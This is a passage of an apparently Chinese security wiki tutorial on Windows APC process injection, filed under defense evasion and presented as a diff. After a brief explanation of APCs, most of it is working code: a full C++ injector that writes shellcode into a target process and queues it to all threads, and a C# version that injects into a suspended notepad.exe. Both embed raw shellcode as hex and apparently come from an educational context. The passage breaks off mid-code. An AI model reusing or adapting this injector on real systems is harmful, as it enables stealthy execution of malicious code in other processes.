+<p>2、I/O管理器使用APCs来完成一个线程发起的异步的I/O操作。例如：当一个设备驱动调用IoCompleteRequest来通知I/O管理器，它已经结束处理一个异步I/O请求时，I/O管理器排队一个APC到发起请求的线程。然后线程在一个较低IRQL级别，来执行APC。 APC的作用是从系统空间拷贝I/O操作结果和状态信息到线程虚拟内存空间的一个缓冲中。</p>
+<p>3、使用APC可以得到或者设置一个线程的上下文和挂起线程的执行。</p>
+<h2 id="Procedure"><a href="#Procedure" class="headerlink" title="Procedure"></a>Procedure</h2><h4 id="APC注入一般步骤"><a href="#APC注入一般步骤" class="headerlink" title="APC注入一般步骤"></a>APC注入一般步骤</h4><p><img src="/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Defense%20Evasion/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/Shellcode-APC%E6%B3%A8%E5%85%A5%E5%92%8C%E5%8A%A0%E8%BD%BD/1.png"></p>
+<p>APC注入步骤简单概述，以explorer.exe进程的APC注入为例：</p>
+<ul>
+<li>编写一个 IinjectQueuerAPC.exe</li>
+<li>查找 explorer.exe 进程 ID</li>
+<li>在 explorer.exe 进程内存空间分配内存</li>
+<li>将 shellcode 写入该内存位置</li>
+<li>查找 explorer.exe 中的所有thread</li>
+<li>在 explorer.exe 中查找所有线程，将 APC 队列到所有这些线程</li>
+<li>将APC指向shellcode</li>
+<li>当 explorer.exe 中的线程被调度时，我们的 shellcode 就会被执行</li>
+</ul>
+<h4 id="APC注入（C-）"><a href="#APC注入（C-）" class="headerlink" title="APC注入（C++）"></a>APC注入（C++）</h4><p>通常 explorer.exe有很多线程活动，所以有机会遇到一个处于alertable的线程，为了更好的演示，写一个处于alterable状态的sleepex.exe，将shellcode注入sleepex.exe的APC队列里。</p>
+<p>sleepex.exe</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enter alertable statues...............&quot;</span>);</span><br><span class="line">    <span class="built_in">SleepEx</span>(<span class="number">1000</span>*<span class="number">600</span>,TRUE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 通过 Process32First 和 Process32Next 调用，根据进程名，找到目标进程</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">Process32First</span>(snapshot, &amp;processEntry)) &#123;</span><br><span class="line">    <span class="keyword">while</span> (_wcsicmp(processEntry.szExeFile, <span class="string">L&quot;sleepex.exe&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">Process32Next</span>(snapshot, &amp;processEntry);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后打开进程、分配空间、写入shellcode；</p>
+<p>找到 explorer 进程的PID，需要获取 sleepex.exe 进程的句柄并为 shellcode 分配一些内存。 将 shellcode 写入sleepex 的进程内存。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*在目标进程中申请一个空间</span></span><br><span class="line"><span class="comment">    获取目标进程句柄</span></span><br><span class="line"><span class="comment">    参数1：想要拥有的进程权限（本例为所有能获得的权限）</span></span><br><span class="line"><span class="comment">    参数2：表示所得到的进程句柄是否可以被继承</span></span><br><span class="line"><span class="comment">    参数3：被打开进程的PID</span></span><br><span class="line"><span class="comment">    返回值:指定进程的句柄</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">victimProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="number">0</span>, processEntry.th32ProcessID);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    在目标进程的内存里开辟空间</span></span><br><span class="line"><span class="comment">    参数1：目标进程句柄</span></span><br><span class="line"><span class="comment">    参数2：保留页面的内存地址，一般用NULL自动分配</span></span><br><span class="line"><span class="comment">    参数3：欲分配的内存大小，字节单位</span></span><br><span class="line"><span class="comment">    参数4：MEM_COMMIT：为特定的页面区域分配内存中或磁盘的页面文件中的物理存储</span></span><br><span class="line"><span class="comment">    参数5：PAGE_EXECUTE_READWRITE 区域可被应用程序读写执行</span></span><br><span class="line"><span class="comment">    返回值：执行成功就返回分配内存的首地址，不成功就是NULL</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">LPVOID shellAddress = <span class="built_in">VirtualAllocEx</span>(victimProcess, <span class="literal">NULL</span>, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;</span><br><span class="line"></span><br><span class="line"><span class="comment">//把shellcode写入到目标进程的内存空间中</span></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">    写shellcode到刚才给指定进程所开辟的内存空间里</span></span><br><span class="line"><span class="comment">    参数1：OpenProcess返回的进程句柄</span></span><br><span class="line"><span class="comment">    参数2：准备写入的内存首地址</span></span><br><span class="line"><span class="comment">    参数3：指向要写的数据的指针（准备写入的东西）</span></span><br><span class="line"><span class="comment">    参数4：要写入的字节数（东西的长度+0/）</span></span><br><span class="line"><span class="comment">    参数5： 返回值。返回实际写入的字节</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(victimProcess, shellAddress, buf, shellSize, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
+
+<p>遍历 sleepex.exe 的所有线程，并调用QueueUserAPC，将shellcode注入目标线程。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">Thread32First</span>(snapshot, &amp;threadEntry)) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) &#123;</span><br><span class="line">                threadIds.<span class="built_in">push_back</span>(threadEntry.th32ThreadID);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="built_in">Thread32Next</span>(snapshot, &amp;threadEntry));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (DWORD threadId : threadIds) &#123;</span><br><span class="line">        threadHandle = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, TRUE, threadId);</span><br><span class="line">        <span class="built_in">QueueUserAPC</span>((PAPCFUNC)apcRoutine, threadHandle, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">1000</span> * <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>完整InjectAPC.cpp代码：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">wchar_t</span> *<span class="title">GetWC</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">size_t</span> cSize = <span class="built_in">strlen</span>(c)+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">wchar_t</span>* wc = <span class="keyword">new</span> <span class="keyword">wchar_t</span>[cSize];</span><br><span class="line">    <span class="built_in">mbstowcs</span> (wc, c, cSize);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] = <span class="string">&quot;\xE9\x8B\x01\x00\x00\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\x64\xA1\x30\x00\x00\x00\x85\xC0\x78\x0D\x8B\x40\x0C\x8B\x40\x14\x8B\x00\x8B\x00\x8B\x40\x10\xC3\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\x55\x8B\xEC\x83\xEC\x40\x53\x56\x8B\xD9\x57\x89\x5D\xF4\xE8\xCD\xFF\xFF\xFF\x8B\xF0\x33\xFF\x8B\x56\x3C\x39\x7C\x32\x7C\x75\x07\x33\xFF\xE9\x9C\x00\x00\x00\x8B\x44\x32\x78\x85\xC0\x74\xF1\x8B\x54\x30\x18\x85\xD2\x74\xE9\x8B\x4C\x30\x24\x8B\x5C\x30\x20\x03\xCE\x8B\x44\x30\x1C\x03\xDE\x03\xC6\x89\x4D\xFC\x33\xC9\x89\x45\xF8\x4A\x8B\x04\x8B\x03\xC6\x80\x38\x47\x75\x4E\x80\x78\x01\x65\x75\x48\x80\x78\x02\x74\x75\x42\x80\x78\x03\x50\x75\x3C\x80\x78\x04\x72\x75\x36\x80\x78\x05\x6F\x75\x30\x80\x78\x06\x63\x75\x2A\x80\x78\x07\x41\x75\x24\x80\x78\x08\x64\x75\x1E\x80\x78\x09\x64\x75\x18\x80\x78\x0A\x72\x75\x12\x80\x78\x0B\x65\x75\x0C\x80\x78\x0C\x73\x75\x06\x80\x78\x0D\x73\x74\x07\x41\x3B\xCA\x76\xA3\xEB\x0F\x8B\x45\xFC\x8B\x7D\xF8\x0F\xB7\x04\x48\x8B\x3C\x87\x03\xFE\x8B\x5D\xF4\x8D\x45\xC0\x89\x3B\x50\xC7\x45\xC0\x4C\x6F\x61\x64\xC7\x45\xC4\x4C\x69\x62\x72\xC7\x45\xC8\x61\x72\x79\x41\xC6\x45\xCC\x00\xE8\xF9\xFE\xFF\xFF\x50\x8B\x03\xFF\xD0\x8D\x4D\xDC\x89\x43\x04\x51\x8D\x4D\xE8\xC7\x45\xE8\x55\x73\x65\x72\x51\xC7\x45\xEC\x33\x32\x2E\x64\x66\xC7\x45\xF0\x6C\x6C\xC6\x45\xF2\x00\xC7\x45\xDC\x4D\x65\x73\x73\xC7\x45\xE0\x61\x67\x65\x42\xC7\x45\xE4\x6F\x78\x41\x00\xFF\xD0\x50\x8B\x03\xFF\xD0\x89\x43\x08\x8D\x45\xD0\x50\xC7\x45\xD0\x43\x72\x65\x61\xC7\x45\xD4\x74\x65\x46\x69\xC7\x45\xD8\x6C\x65\x41\x00\xE8\x94\xFE\xFF\xFF\x50\x8B\x03\xFF\xD0\x5F\x5E\x89\x43\x0C\x5B\x8B\xE5\x5D\xC3\xCC\xCC\xCC\xCC\xCC\x55\x8B\xEC\x83\xEC\x24\x8D\x4D\xDC\xE8\x92\xFE\xFF\xFF\x6A\x00\x8D\x45\xFC\xC7\x45\xEC\x48\x65\x6C\x6C\x50\x8D\x45\xEC\x66\xC7\x45\xF0\x6F\x21\x50\x6A\x00\xC6\x45\xF2\x00\xC7\x45\xFC\x54\x69\x70\x00\xFF\x55\xE4\x6A\x00\x6A\x00\x6A\x02\x6A\x00\x6A\x00\x68\x00\x00\x00\x40\x8D\x45\xF4\xC7\x45\xF4\x31\x2E\x74\x78\x50\x66\xC7\x45\xF8\x74\x00\xFF\x55\xE8\x8B\xE5\x5D\xC3\xCC\xCC\xCC\xCC&quot;</span>;</span><br><span class="line">	HANDLE snapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line">	HANDLE victimProcess = <span class="literal">NULL</span>;</span><br><span class="line">	PROCESSENTRY32 processEntry = &#123; <span class="built_in"><span class="keyword">sizeof</span></span>(PROCESSENTRY32) &#125;;</span><br><span class="line">	THREADENTRY32 threadEntry = &#123; <span class="built_in"><span class="keyword">sizeof</span></span>(THREADENTRY32) &#125;;</span><br><span class="line">	std::vector&lt;DWORD&gt; threadIds;</span><br><span class="line">	SIZE_T shellSize = <span class="built_in"><span class="keyword">sizeof</span></span>(shellcode);</span><br><span class="line">	HANDLE threadHandle = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">Process32First</span>(snapshot, &amp;processEntry)) &#123;</span><br><span class="line">		<span class="keyword">while</span> (_wcsicmp(<span class="built_in">GetWC</span>(processEntry.szExeFile), <span class="string">L&quot;sleepex.exe&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">Process32Next</span>(snapshot, &amp;processEntry);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;processEntry.szExeFile is: %ls \n&quot;</span>, <span class="built_in">GetWC</span>(processEntry.szExeFile));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	victimProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="number">0</span>, processEntry.th32ProcessID);</span><br><span class="line">	LPVOID shellAddress = <span class="built_in">VirtualAllocEx</span>(victimProcess, <span class="literal">NULL</span>, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;</span><br><span class="line">	<span class="built_in">WriteProcessMemory</span>(victimProcess, shellAddress, shellcode, shellSize, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;shellAddress is: %p\n&quot;</span>, shellAddress);</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">Thread32First</span>(snapshot, &amp;threadEntry)) &#123;</span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) &#123;</span><br><span class="line">				threadIds.<span class="built_in">push_back</span>(threadEntry.th32ThreadID);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">while</span> (<span class="built_in">Thread32Next</span>(snapshot, &amp;threadEntry));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (DWORD threadId : threadIds) &#123;</span><br><span class="line">		threadHandle = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, TRUE, threadId);</span><br><span class="line">		<span class="built_in">QueueUserAPC</span>((PAPCFUNC)apcRoutine, threadHandle, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;apcRoutine is: %p------&gt;threadId:%d\n&quot;</span>, apcRoutine, threadId);</span><br><span class="line">		<span class="built_in">Sleep</span>(<span class="number">1000</span> * <span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译运行后，shellcode被执行弹出对话框</p>
+<p><img src="/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Defense%20Evasion/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/Shellcode-APC%E6%B3%A8%E5%85%A5%E5%92%8C%E5%8A%A0%E8%BD%BD/3.png"></p>
+<h4 id="APC注入（C-）-1"><a href="#APC注入（C-）-1" class="headerlink" title="APC注入（C#）"></a>APC注入（C#）</h4><p>下面使用c#编写APC注入，C#思路是直接起一个新的notepad.exe进程，并设置alterable状态，然后直接进行APC注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Reflection;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line">public class ApcInjectionNewProcess</span><br><span class="line">&#123;</span><br><span class="line">       public static void Main()</span><br><span class="line">       &#123;      </span><br><span class="line">              byte[] shellcode = new byte[112]&#123;0x50,0x51,0x52,0x53,0x56,0x57,0x55,0x54,0x58,0x66,0x83,0xe4,0xf0,0x50,0x6a,0x60,0x5a,0x68,0x63,0x61,0x6c,0x63,0x54,0x59,0x48,0x29,0xd4,0x65,0x48,0x8b,0x32,0x48,0x8b,0x76,0x18,0x48,0x8b,0x76,0x10,0x48,0xad,0x48,0x8b,0x30,0x48,0x8b,0x7e,0x30,0x03,0x57,0x3c,0x8b,0x5c,0x17,0x28,0x8b,0x74,0x1f,0x20,0x48,0x01,0xfe,0x8b,0x54,0x1f,0x24,0x0f,0xb7,0x2c,0x17,0x8d,0x52,0x02,0xad,0x81,0x3c,0x07,0x57,0x69,0x6e,0x45,0x75,0xef,0x8b,0x74,0x1f,0x1c,0x48,0x01,0xfe,0x8b,0x34,0xae,0x48,0x01,0xf7,0x99,0xff,0xd7,0x48,0x83,0xc4,0x68,0x5c,0x5d,0x5f,0x5e,0x5b,0x5a,0x59,0x58,0xc3&#125;;</span><br><span class="line">              </span><br><span class="line">              // Target process to inject into</span><br><span class="line">              string processpath = @&quot;C:\Windows\notepad.exe&quot;;</span><br><span class="line">              STARTUPINFO si = new STARTUPINFO();</span><br><span class="line">              PROCESS_INFORMATION pi = new PROCESS_INFORMATION();</span><br><span class="line">              </span><br><span class="line">              // Create new process in suspended state to inject into</span><br><span class="line">              bool success = CreateProcess(processpath, null,</span><br><span class="line">                     IntPtr.Zero, IntPtr.Zero, false,</span><br><span class="line">                     ProcessCreationFlags.CREATE_SUSPENDED,</span><br><span class="line">                     IntPtr.Zero, null, ref si, out pi);</span><br><span class="line">              </span><br><span class="line">              // Allocate memory within process and write shellcode</span><br><span class="line">              IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, shellcode.Length,MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">              IntPtr bytesWritten = IntPtr.Zero;</span><br><span class="line">              bool resultBool = WriteProcessMemory(pi.hProcess,resultPtr,shellcode,shellcode.Length, out bytesWritten);</span><br><span class="line">              </span><br><span class="line">              // Open thread</span><br><span class="line">              IntPtr sht = OpenThread(ThreadAccess.SET_CONTEXT, false, (int)pi.dwThreadId);</span><br><span class="line">              uint oldProtect = 0;</span><br><span class="line">              </span><br><span class="line">              // Modify memory permissions on allocated shellcode</span><br><span class="line">              resultBool = VirtualProtectEx(pi.hProcess,resultPtr, shellcode.Length,PAGE_EXECUTE_READ, out oldProtect);</span><br><span class="line">              </span><br><span class="line">              // Assign address of shellcode to the target thread apc queue</span><br><span class="line">              IntPtr ptr = QueueUserAPC(resultPtr,sht,IntPtr.Zero);</span><br><span class="line">              </span><br><span class="line">              IntPtr ThreadHandle = pi.hThread;</span><br><span class="line">              ResumeThread(ThreadHandle);</span><br><span class="line">              </span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       </span><br><span class="line">       private static UInt32 MEM_COMMIT = 0x1000;</span><br><span class="line"> </span><br><span class="line">       private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; //I&#x27;m not using this #DFIR</span><br><span class="line">       private static UInt32 PAGE_READWRITE = 0x04;</span><br><span class="line">       private static UInt32 PAGE_EXECUTE_READ = 0x20;</span><br><span class="line">       </span><br><span class="line">       </span><br><span class="line">       [Flags]</span><br><span class="line">       public enum ProcessAccessFlags : uint</span><br><span class="line">       &#123;</span><br><span class="line">              All = 0x001F0FFF,</span><br><span class="line">              Terminate = 0x00000001,</span><br><span class="line">              CreateThread = 0x00000002,</span><br><span class="line">              VirtualMemoryOperation = 0x00000008,</span><br><span class="line">              VirtualMemoryRead = 0x00000010,</span><br><span class="line">              VirtualMemoryWrite = 0x00000020,</span><br><span class="line">              DuplicateHandle = 0x00000040,</span><br><span class="line">              CreateProcess = 0x000000080,</span><br><span class="line">              SetQuota = 0x00000100,</span><br><span class="line">              SetInformation = 0x00000200,</span><br><span class="line">              QueryInformation = 0x00000400,</span><br><span class="line">              QueryLimitedInformation = 0x00001000,</span><br><span class="line">              Synchronize = 0x00100000</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       [Flags]</span><br><span class="line">       public enum ProcessCreationFlags : uint</span><br><span class="line">       &#123;</span><br><span class="line">              ZERO_FLAG = 0x00000000,</span><br><span class="line">              CREATE_BREAKAWAY_FROM_JOB = 0x01000000,</span><br><span class="line">              CREATE_DEFAULT_ERROR_MODE = 0x04000000,</span><br><span class="line">              CREATE_NEW_CONSOLE = 0x00000010,</span><br><span class="line">              CREATE_NEW_PROCESS_GROUP = 0x00000200,</span><br><span class="line">              CREATE_NO_WINDOW = 0x08000000,</span><br><span class="line">              CREATE_PROTECTED_PROCESS = 0x00040000,</span><br><span class="line">              CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,</span><br><span class="line">              CREATE_SEPARATE_WOW_VDM = 0x00001000,</span><br><span class="line">              CREATE_SHARED_WOW_VDM = 0x00001000,</span><br><span class="line">              CREATE_SUSPENDED = 0x00000004,</span><br><span class="line">              CREATE_UNICODE_ENVIRONMENT = 0x00000400,</span><br><span class="line">              DEBUG_ONLY_THIS_PROCESS = 0x00000002,</span><br><span class="line">              DEBUG_PROCESS = 0x00000001,</span><br><span class="line">              DETACHED_PROCESS = 0x00000008,</span><br><span class="line">              EXTENDED_STARTUPINFO_PRESENT = 0x00080000,</span><br><span class="line">              INHERIT_PARENT_AFFINITY = 0x00010000</span><br><span class="line">       &#125;</span><br><span class="line">       public struct PROCESS_INFORMATION</span><br><span class="line">       &#123;</span><br><span class="line">              public IntPtr hProcess;</span><br><span class="line">              public IntPtr hThread;</span><br><span class="line">              public uint dwProcessId;</span><br><span class="line">              public uint dwThreadId;</span><br><span class="line">       &#125;</span><br><span class="line">       public struct STARTUPINFO</span><br><span class="line">       &#123;</span><br><span class="line">              public uint cb;</span><br><span class="line">              public string lpReserved;</span><br><span class="line">              public string lpDesktop;</span><br><span class="line">              public string lpTitle;</span><br><span class="line">              public uint dwX;</span><br><span class="line">              public uint dwY;</span><br><span class="line">              public uint dwXSize;</span><br><span class="line">              public uint dwYSize;</span><br><span class="line">              public uint dwXCountChars;</span><br><span class="line">              public uint dwYCountChars;</span><br><span class="line">              public uint dwFillAttribute;</span><br><span class="line">              public uint dwFlags;</span><br><span class="line">              public short wShowWindow;</span><br><span class="line">              public short cbReserved2;</span><br><span class="line">              public IntPtr lpReserved2;</span><br><span class="line">              public IntPtr hStdInput;</span><br><span class="line">              public IntPtr hStdOutput;</span><br><span class="line">              public IntPtr hStdError;</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       [Flags]</span><br><span class="line">       public enum    ThreadAccess : int</span><br><span class="line">       &#123;</span><br><span class="line">              TERMINATE           = (0x0001)  ,</span><br><span 